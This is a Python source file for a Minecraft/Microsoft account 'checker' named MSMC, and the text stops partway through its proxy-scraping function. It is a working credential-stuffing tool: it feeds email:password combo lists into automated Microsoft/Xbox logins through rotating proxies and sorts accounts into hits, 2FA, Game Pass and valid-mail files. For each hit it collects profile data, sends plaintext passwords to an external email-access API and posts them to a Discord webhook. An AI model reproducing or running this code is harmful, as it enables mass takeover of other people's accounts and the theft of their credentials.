import requests, re, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, socket, socks, sys
import subprocess
from colorama import Fore
from datetime import datetime, timezone

# --- Dependency Check and Installation ---
def install_dependencies():
    """
    Checks if required modules are installed. If not, attempts to install them
    from requirements.txt using pip.
    """
    print(Fore.CYAN + "Checking for required Python packages...")
    try:
        # Attempt to import a core module to check if packages are installed
        import mcproto.connection
        print(Fore.GREEN + "All required packages are already installed.")
        return True # Indicate success
    except ImportError:
        print(Fore.YELLOW + "One or more required packages not found. Attempting to install from requirements.txt...")
        try:
            # Use sys.executable to ensure the correct pip for the current Python environment is used
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
            print(Fore.GREEN + "Successfully installed required packages.")
            return True # Indicate success
        except subprocess.CalledProcessError as e:
            print(Fore.RED + f"Error installing packages: {e}")
            print(Fore.RED + "Please ensure you have a 'requirements.txt' file in the same directory as this script,")
            print(Fore.RED + "and that you have internet access and sufficient permissions.")
            return False # Indicate failure
        except Exception as e:
            print(Fore.RED + f"An unexpected error occurred during package installation: {e}")
            return False # Indicate failure

# --- IMPORTANT: Call the dependency check BEFORE other imports ---
if not install_dependencies():
    sys.exit(1) # Exit if dependencies could not be installed

# Now, after successful dependency check/install, import the specific modules
# All mcproto imports are now correctly placed and handled
from mcproto.connection import SyncConnection as MCProtoConnection 
# LoginDisconnect is now handled via general Exception catching, as its exact location in mcproto
# is not consistently exposed as a top-level importable exception.

from urllib.parse import urlparse, parse_qs
from io import StringIO

# --- Global Variables ---
logo = Fore.GREEN+'''
     ███▄ ▄███▓  ██████  ███▄ ▄███▓ ▄████▄  
    ▓██▒▀█▀ ██▒▒██    ▒ ▓██▒▀█▀ ██▒▒██▀ ▀█  
    ▓██    ▓██░░ ▓██▄   ▓██    ▓██░▒▓█    ▄ 
    ▒██    ▒██   ▒   ██▒▒██    ▒██ ▒▓▓▄ ▄██▒
    ▒██▒   ░██▒▒██████▒▒▒██▒   ░██▒▒ ▓███▀ ░
    ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░ ░▒ ▒  ░
    ░  ░      ░░ ░▒  ░ ░░  ░      ░  ░  ▒   
    ░      ░   ░  ░  ░  ░      ░   ░        
           ░         ░         ░   ░ ░      
                                   ░        \n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
urllib3.disable_warnings() # Spams warnings because unverified requests are sent for debugging purposes
warnings.filterwarnings("ignore") # Spams python warnings on some functions, some outdated things may be used

# sys.stderr = open(os.devnull, 'w') # Commented out as it hides errors, uncomment if you understand the implications

class Config:
    """
    A simple configuration class to store and retrieve settings.
    """
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    """
    Handles capturing and processing account information, including
    Hypixel stats, Optifine cape, email access, and name change availability.
    """
    def __init__(self, email, password, name, capes, uuid, token, type):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        """
        Builds a formatted message string with all captured account details.
        """
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message+"\n============================\n"

    def notify(self):
        """
        Sends a notification to the configured Discord webhook with account details.
        """
        global errors
        try:
            payload = {
                "content": config.get('message')
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<name>", self.name or "N/A")
                    .replace("<hypixel>", self.hypixl or "N/A")
                    .replace("<level>", self.level or "N/A")
                    .replace("<firstlogin>", self.firstlogin or "N/A")
                    .replace("<lastlogin>", self.lastlogin or "N/A")
                    .replace("<ofcape>", self.cape or "N/A")
                    .replace("<capes>", self.capes or "N/A")
                    .replace("<access>", self.access or "N/A")
                    .replace("<skyblockcoins>", self.sbcoins or "N/A")
                    .replace("<bedwarsstars>", self.bwstars or "N/A")
                    .replace("<banned>", self.banned or "Unknown")
                    .replace("<namechange>", self.namechanged or "N/A")
                    .replace("<lastchanged>", self.lastchanged or "N/A")
                    .replace("<type>", self.type or "N/A"),
                "username": "MSMC"
            }
            requests.post(config.get('webhook'), data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except: pass # Suppress errors for webhook notification

    def hypixel(self):
        """
        Fetches Hypixel statistics for the account.
        """
        global errors
        try:
            if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname') is True: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        """
        Checks if the account has an Optifine cape.
        """
        if config.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        """
        Checks for email access using an external API.
        """
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text) #my mailaccess checking api pls dont rape or it will go offline prob (weak hosting)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        """
        Checks if the Minecraft name can be changed and when it was last changed.
        """
        if config.get('namechange') is True or config.get('lastchanged') is True:
            tries = 0
            while tries < maxretries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged') is True:
                                created_at = datetime.strptime(data.get('createdAt'), "%Y-%m-%dT%H:%M:%S.%fZ").replace(tzinfo=timezone.utc)
                                formatted = created_at.strftime("%m/%d/%Y")
                                current_date = datetime.now(timezone.utc)
                                difference = current_date - created_at
                                years = difference.days // 365
                                months = (difference.days % 365) // 30
                                days = difference.days

                                if years > 0:
                                    self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at.isoformat()}"
                                elif months > 0:
                                    self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at.isoformat()}"
                                else:
                                    self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at.isoformat()}"
                                break
                        except: pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(20)
                        # Recursive call, might lead to deep recursion if not careful.
                        # Consider iterative approach or a retry decorator for robustness.
                        Capture.namechange(self) 
                except: pass
                tries+=1
                retries+=1
    
    def ban(self):
        """
        Checks if the account is banned on Hypixel using a direct connection.
        This part now uses mcproto library.
        """
        global errors
        if config.get('hypixelban') is True:
            tries = 0
            while tries < maxretries:
                # mcproto.connection.SyncConnection for synchronous connection
                # Pass access_token and profile_id (uuid) directly to MCProtoConnection
                connection = MCProtoConnection(
                    host="alpha.hypixel.net",
                    port=25565,
                    access_token=self.token,
                    profile_id=self.uuid,
                    initial_version=47 # Specify protocol version
                )
                
                try:
                    if len(banproxies) > 0:
                        proxy = random.choice(banproxies)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket # This line hooks global socket module, might affect other parts
                    
                    original_stderr = sys.stderr
                    sys.stderr = StringIO() # Temporarily redirect stderr to suppress library output
                    try: 
                        connection.connect() # This will attempt to connect and handle login
                        # If connection is successful and no DisconnectPacket is received,
                        # it means the account is likely not banned.
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        connection.disconnect() # Disconnect after successful check
                    except Exception as e: # Catch all exceptions during connection attempt
                        disconnect_data = None
                        # Attempt to get disconnect_reason if it exists (e.g., from a specific mcproto exception)
                        if hasattr(e, 'disconnect_reason'):
                            disconnect_data = e.disconnect_reason
                        else:
                            # Fallback to string representation of the exception
                            disconnect_data = str(e)
                        
                        self.banned = f"Disconnected: {disconnect_data}" # Default message

                        # Attempt to parse as JSON if it's a string, and extract relevant info
                        try:
                            if isinstance(disconnect_data, str):
                                reason_json = json.loads(disconnect_data)
                                if 'extra' in reason_json and isinstance(reason_json['extra'], list):
                                    # Join all 'text' parts from the 'extra' list
                                    self.banned = ''.join(item.get("text", "") for item in reason_json['extra'] if isinstance(item, dict))
                                elif 'text' in reason_json:
                                    self.banned = reason_json['text']
                                elif isinstance(reason_json, str): # Fallback if it's a string that was somehow loaded as JSON
                                    self.banned = reason_json
                            else: # If disconnect_data is already an object/dict
                                reason_json = disconnect_data
                                if 'extra' in reason_json and isinstance(reason_json['extra'], list):
                                    self.banned = ''.join(item.get("text", "") for item in reason_json['extra'] if isinstance(item, dict))
                                elif 'text' in reason_json:
                                    self.banned = reason_json['text']

                        except (json.JSONDecodeError, TypeError):
                            # If not JSON or parsing fails, use the raw string representation
                            if not isinstance(disconnect_data, str):
                                self.banned = str(disconnect_data) # Ensure it's a string
                            # self.banned already set to f"Disconnected: {disconnect_data}" if it was a string
                            pass # Already handled by initial self.banned assignment

                        # Check if the parsed reason indicates a ban
                        if "banned" in self.banned.lower() or "suspicious activity" in self.banned.lower():
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                        else:
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    except Exception as e: # Catch any errors during the parsing of disconnect_data
                        # print(f"Error parsing disconnect reason: {e}") # For debugging
                        pass # Already handled by outer exception
                    finally:
                        sys.stderr = original_stderr # Restore stderr
                except Exception as e:
                    # Errors during proxy setup or other pre-connection issues
                    # print(f"Ban check proxy setup error: {e}") # For debugging
                    pass
                
                if self.banned != None: break
                tries+=1

    def handle(self):
        """
        Handles the overall capture process for a single account.
        """
        global hits
        hits+=1
        if screen == "'2'": print(Fore.GREEN+f"Hit: {self.name} | {self.email}:{self.password}")
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        if self.name != 'N/A':
            try: Capture.hypixel(self)
            except: pass
            try: Capture.optifine(self)
            except: pass
            try: Capture.full_access(self)
            except: pass
            try: Capture.namechange(self)
            except: pass
            try: Capture.ban(self)
            except: pass
        open(f"results/{fname}/Capture.txt", 'a').write(Capture.builder(self))
        Capture.notify(self)

class Login:
    """
    A simple class to hold login credentials.
    """
    def __init__(self, email, password):
        self.email = email
        self.password = password
        
def get_urlPost_sFTTag(session):
    """
    Retrieves the urlPost and sFTTag from the Microsoft login page.
    """
    global retries
    while True: #will retry forever until it gets a working request/url.
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            match = re.match(r'.*value="(.+?)".*', text, re.S)
            if match is not None:
                sFTTag = match.group(1)
                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                if match is not None:
                    return match.group(1), sFTTag, session
        except: pass
        session.proxies = getproxy() # Use .proxies for requests session
        retries+=1

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    """
    Performs the Xbox Live authentication to get an access token.
    """
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                with open(f"results/{fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
            else:
                session.proxies = getproxy() # Use .proxies for requests session
                retries+=1
                tries+=1
        except:
            session.proxies = getproxy() # Use .proxies for requests session
            retries+=1
            tries+=1
    bad+=1
    checked+=1
    cpm+=1
    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    return "None", session

def validmail(email, password):
    """
    Logs valid mail accounts.
    """
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX+f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    """
    Captures Minecraft profile information.
    """
    global retries
    while True:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type)
                CAPTURE.handle()
                break
            elif r.status_code == 429:
                retries+=1
                session.proxies = getproxy() # Use .proxies for requests session
                if len(proxylist) < 5: time.sleep(20)
                continue
            else: break
        except:
            retries+=1
            session.proxies = getproxy() # Use .proxies for requests session
            continue

def checkmc(session, email, password, token):
    """
    Checks for Minecraft entitlements (Game Pass, Bedrock, Dungeons, Legends).
    """
    global retries, cpm, checked, xgp, xgpu, other
    while True:
        checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
        if checkrq.status_code == 200:
            if 'product_game_pass_ultimate' in checkrq.text:
                xgpu+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass Ultimate: {email}:{password}")
                with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
                try: capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                except: 
                    CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]")
                    CAPTURE.handle()
                return True
            elif 'product_game_pass_pc' in checkrq.text:
                xgp+=1
                cpm+=1
                checked+=1
                if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Xbox Game Pass: {email}:{password}")
                with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
                capture_mc(token, session, email, password, "Xbox Game Pass")
                return True
            elif '"product_minecraft"' in checkrq.text:
                checked+=1
                cpm+=1
                capture_mc(token, session, email, password, "Normal")
                return True
            else:
                others = []
                if 'product_minecraft_bedrock' in checkrq.text:
                    others.append("Minecraft Bedrock")
                if 'product_legends' in checkrq.text:
                    others.append("Minecraft Legends")
                if 'product_dungeons' in checkrq.text:
                    others.append('Minecraft Dungeons')
                if others != []:
                    other+=1
                    cpm+=1
                    checked+=1
                    items = ', '.join(others)
                    open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
                    if screen == "'2'": print(Fore.YELLOW+f"Other: {email}:{password} | {items}")
                    return True
                else:
                    return False
        elif checkrq.status_code == 429:
            retries+=1
            session.proxies = getproxy() # Use .proxies for requests session
            if len(proxylist) < 1: time.sleep(20)
            continue
        else:
            return False

def mc_token(session, uhs, xsts_token):
    """
    Obtains the Minecraft access token from Xbox Live tokens.
    """
    global retries
    while True:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxies = getproxy() # Use .proxies for requests session
                if len(proxylist) < 1: time.sleep(20)
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries+=1
            session.proxies = getproxy() # Use .proxies for requests session
            continue

def authenticate(email, password, tries = 0):
    """
    Authenticates a Minecraft account through Microsoft/Xbox Live.
    """
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy() # Set initial proxy for the session
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token)
            except Exception as e:
                # print(f"Error during Minecraft token acquisition/check: {e}") # For debugging
                pass
            if hit == False: validmail(email, password)
    except Exception as e:
        # print(f"Authentication top-level error: {e}") # For debugging
        if tries < maxretries:
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    finally:
        session.close()

def Load():
    """
    Loads combo accounts from a user-specified file path.
    Replaced tkinter.filedialog with console input.
    This function is now largely unused if Main() loads emails.txt directly.
    """
    global Combos, fname
    while True:
        file_path = input(Fore.LIGHTBLUE_EX + "Enter the path to your Combo file (e.g., combos.txt): ")
        if not os.path.exists(file_path):
            print(Fore.LIGHTRED_EX + "File not found. Please enter a valid path.")
            continue
        
        fname = os.path.splitext(os.path.basename(file_path))[0]
        try:
            with open(file_path, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.LIGHTBLUE_EX + f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
                print(Fore.LIGHTBLUE_EX + f"[{len(Combos)}] Combos Loaded.")
            break # Exit loop if file loaded successfully
        except Exception as ex:
            print(Fore.LIGHTRED_EX + f"Your file is probably harmed or has an encoding issue: {ex}")
            time.sleep(2)

def Proxys():
    """
    Loads proxies from a user-specified file path.
    Replaced tkinter.filedialog with console input.
    """
    global proxylist
    while True:
        file_path = input(Fore.LIGHTBLUE_EX + "Enter the path to your Proxy file (e.g., proxies.txt): ")
        if not os.path.exists(file_path):
            print(Fore.LIGHTRED_EX + "File not found. Please enter a valid path.")
            continue
        
        try:
            with open(file_path, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX + f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
            break
        except Exception as ex:
            print(Fore.LIGHTRED_EX + f"Your file is probably harmed or has an encoding issue: {ex}")
            time.sleep(2)

def logscreen():
    """
    Updates the console title with checking statistics (for Log screen mode).
    """
    global cpm, cpm1
    cpm1 = cpm
    cpm = 0
    print(f"\rChecked: {checked}/{len(Combos)} - Hits: {hits} - Bad: {bad} - 2FA: {twofa} - SFA: {sfa} - MFA: {mfa} - XGP: {xgp} - XGPU: {xgpu} - VM: {vm} - Other: {other} - Cpm: {cpm1*60} - Retries: {retries} - Errors: {errors}", end="")
    time.sleep(1)
    threading.Thread(target=logscreen).start()    

def cuiscreen():
    """
    Displays checking statistics in a CUI (Console User Interface) format.
    """
    global cpm, cpm1
    os.system('clear') # Changed 'cls' to 'clear' for Linux/Replit compatibility
    cpm1 = cpm
    cpm = 0
    print(logo)
    print(f" [{checked}] Checked") # Changed from checked/len(Combos) to just checked in CUI for cleaner look
    print(f" [{hits}] Hits")
    print(f" [{bad}] Bad")
    print(f" [{sfa}] SFA")
    print(f" [{mfa}] MFA")
    print(f" [{twofa}] 2FA")
    print(f" [{xgp}] Xbox Game Pass")
    print(f" [{xgpu}] Xbox Game Pass Ultimate")
    print(f" [{other}] Other")
    print(f" [{vm}] Valid Mail")
    print(f" [{retries}] Retries")
    print(f" [{errors}] Errors")
    time.sleep(1)
    threading.Thread(target=cuiscreen).start()

def finishedscreen():
    """
    Displays the final results after checking is complete.
    """
    os.system('clear')
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX+"Finished Checking!")
    print()
    print("Hits: "+str(hits))
    print("Bad: "+str(bad))
    print("SFA: "+str(sfa))
    print("MFA: "+str(mfa))
    print("2FA: "+str(twofa))
    print("Xbox Game Pass: "+str(xgp))
    print("Xbox Game Pass Ultimate: "+str(xgpu))
    print("Other: "+str(other))
    print("Valid Mail: "+str(vm))
    print(Fore.LIGHTRED_EX+"Press Enter to exit.")
    input()

def getproxy():
    """
    Returns a proxy from the proxylist based on the selected proxy type.
    """
    if proxytype == "'5'": return random.choice(proxylist)
    if proxytype != "'4'": 
        proxy = random.choice(proxylist)
        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None

def Checker(combo):
    """
    Processes a single combo (email:password) for authentication.
    """
    global bad, checked, cpm
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    """
    Loads configuration settings from config.ini or creates it if it doesn't exist.
    """
    global maxretries, config
    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        c['Settings'] = {
            'Webhook': 'paste your discord webhook here',
            'Max Retries': 5,
            'Proxyless Ban Check': False,
            'WebhookMessage': '''@everyone HIT: ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>'''}
        c['Scraper'] = {
            'Auto Scrape Minutes': 5
        }
        c['Captures'] = {
            'Hypixel Name': True,
            'Hypixel Level': True,
            'First Hypixel Login': True,
            'Last Hypixel Login': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Hypixel Skyblock Coins': True,
            'Hypixel Bedwars Stars': True,
            'Hypixel Ban': True,
            'Name Change Availability': True,
            'Last Name Change': True
        }
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    maxretries = int(read_config['Settings']['Max Retries'])
    config.set('webhook', str(read_config['Settings']['Webhook']))
    config.set('message', str(read_config['Settings']['WebhookMessage']))
    config.set('proxylessban', str_to_bool(read_config['Settings']['Proxyless Ban Check']))
    config.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
    config.set('hypixelname', str_to_bool(read_config['Captures']['Hypixel Name']))
    config.set('hypixellevel', str_to_bool(read_config['Captures']['Hypixel Level']))
    config.set('hypixelfirstlogin', str_to_bool(read_config['Captures']['First Hypixel Login']))
    config.set('hypixellastlogin', str_to_bool(read_config['Captures']['Last Hypixel Login']))
    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
    config.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
    config.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
    config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))

def get_proxies():
    """
    Scrapes proxies from various online sources.
    This function runs in a separate thread for auto-scraping.
    """
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt"
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt"
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
    ]
    for service in api_http:
        try:
            http.extend(requests.get(service).text.splitlines())
        except: pass
    for service in api_socks4: 
        try:
